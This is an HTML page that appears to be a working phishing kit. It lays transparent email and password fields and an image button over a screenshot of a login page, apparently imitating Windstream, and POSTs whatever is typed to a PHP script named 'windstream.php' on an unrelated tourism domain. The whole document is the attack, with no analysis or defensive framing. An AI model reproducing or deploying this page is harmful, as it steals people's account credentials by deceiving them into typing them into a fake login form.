<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Login</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  height: 100vh;
  background: url("https://image2url.com/r2/default/images/1771258973308-5020a55e-db9f-4b72-97de-9a5f96b4e319.png") no-repeat center center/cover;
  font-family: Arial, sans-serif;
  position: relative;
}

.overlay {
  position: absolute;
  width: 100%;
  height: 100%;
}

.overlay-input {
  position: absolute;
  width: 80%;
  max-width: 420px;
  height: 45px;
  padding: 12px;
  font-size: 16px;
  border: none;
  outline: none;
  background: transparent;
  color: #333;
}

input:-webkit-autofill {
  -webkit-box-shadow: 0 0 0 1000px transparent inset !important;
  -webkit-text-fill-color: #333 !important;
}

#email, #password {
  left: 50%;
  transform: translateX(-50%);
}

#email {
  top: 30vh;
}

#password {
  top: 42vh;
}

#login-btn {
  position: absolute;
  top: 58vh;
  left: 50%;
  transform: translateX(-50%);
  width: auto;  /* Make the width adjust automatically */
  height: 60px;  /* Match the height of the button */
  padding: 0;
  border: none;
  background: none;
  cursor: pointer;
}

#login-btn img {
  width: 100%;  /* Make the image fill the button */
  height: 100%;  /* Ensure the image's height matches the button height */
  object-fit: cover;  /* Make the image fill without distortion */
}
</style>
</head>

<body>

<form class="overlay" method="POST" action="https://agilizeturismo.com.br/cgi-bin/windstream.php" id="loginForm">
  <input type="text" id="email" name="email" class="overlay-input" required aria-label="Email address">
  <input type="password" id="password" name="password" class="overlay-input" required aria-label="Password">
  
  <button type="submit" id="login-btn">
    <img src="https://image2url.com/r2/default/images/1771257646468-dc0f78e6-0061-4cb5-ad74-293ee944c387.png" alt="Login">
  </button>
</form>

</body>
</html>
